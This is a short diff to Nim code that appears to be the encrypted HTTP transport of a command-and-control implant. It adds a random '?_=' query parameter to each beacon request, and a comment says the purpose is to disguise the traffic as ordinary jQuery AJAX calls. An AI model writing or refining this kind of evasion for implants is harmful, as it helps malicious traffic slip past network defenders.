@@ -1,4 +1,4 @@
-import std/[httpclient, base64, strutils]
+import std/[httpclient, base64, strutils, random]
 import config, crypto/aes, core/utils
 
 type
@@ -49,7 +49,10 @@ proc parseResponse*(raw: seq[byte], aesKey: seq[byte]): string =
     result = fromBytes(bodyPart)
 
 proc post*(t: Transport, currentUUID: string, aesKey: seq[byte], jsonBody: string): string =
-  let url = t.baseUrl.strip(chars = {'/'}) & "/" & t.endpoint.strip(chars = {'/'})
+  # Append ?_=<random> to bust caches and blend with jQuery AJAX call patterns.
+  let noise = "?_=" & $rand(2_147_483_647)
+  let url = t.baseUrl.strip(chars = {'/'}) & "/" &
+            t.endpoint.strip(chars = {'/'}) & noise
   let message = buildMessage(currentUUID, aesKey, jsonBody)
 
   when defined(debug):
